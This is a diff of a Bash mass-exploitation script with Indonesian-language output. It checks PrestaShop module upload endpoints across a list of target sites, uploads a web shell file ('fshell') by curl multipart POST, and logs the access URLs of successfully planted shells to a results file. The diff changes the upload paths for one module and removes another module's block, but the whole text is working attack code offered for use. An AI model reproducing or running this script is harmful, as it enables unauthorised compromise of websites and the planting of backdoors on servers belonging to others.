@@ -622,45 +622,21 @@ else
 		echo "JENDELA ${moduleslist[24]} TERTUTUP" 
 #false
 elif
-	[ "251" == "${kamar24}" ] && [ "error" == "${intip24}" ]; then
+	[ "200" == "${kamar24}" ] && [ "error" == "${intip24}" ]; then
 	echo "JENDELA ${moduleslist[24]} TERBUKA"
 	echo "USAHA NGITIPIN ${moduleslist[24]}"
 	# Save URL
-	liatxploit24=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[24]}/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php" | egrep -o "success")
+	liatxploit24=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[24]}/file_upload.php" | egrep -o "success")
 if [ "success" == "${liatxploit24}" ]; then
 	printf ${cyan}
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[24]}/uploads/${fshell}" | tee -a hasil.txt
+	echo "AKSESNYA => : ${url}/modules/${moduleslist[24]}/file_uploads/${fshell}" | tee -a hasil.txt
 	echo "+++++++++++++++++++++++++++++++++++++++++"
 fi 
 else
 	printf ${red}
 	echo "MODULE ${moduleslist[24]} TERGEMBOK"
-	fi
-	printf ${NC}
-	kamar25=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[25]}/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php")
-	intip25=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[25]}/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php" 2>&1 | egrep -o "error") 
-	#sleep 1
-	if [ "404" == "${kamar25}" ] || [ "000" == "${kamar25}" ] || [ "403" == "${kamar25}" ] || [ "301" == "${kamar25}" ] || [ "500" == "${kamar25}" ] || [ "302" == "${kamar25}" ]; then
-		echo "JENDELA ${moduleslist[25]} TERTUTUP" 
-#false
-elif
-	[ "200" == "${kamar25}" ] && [ "error" == "${intip25}" ]; then
-	echo "JENDELA ${moduleslist[25]} TERBUKA"
-	echo "USAHA NGITIPIN ${moduleslist[25]}"
-	# Save URL
-	liatxploit25=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[25]}/file_upload.php" | egrep -o "success")
-if [ "success" == "${liatxploit25}" ]; then
-	printf ${cyan}
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[25]}/file_uploads/${fshell}" | tee -a hasil.txt
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-fi 
-else
-	printf ${red}
-	echo "MODULE ${moduleslist[25]} TERGEMBOK"
 	fi 
 		printf ${NC}
 			done < "$slist"
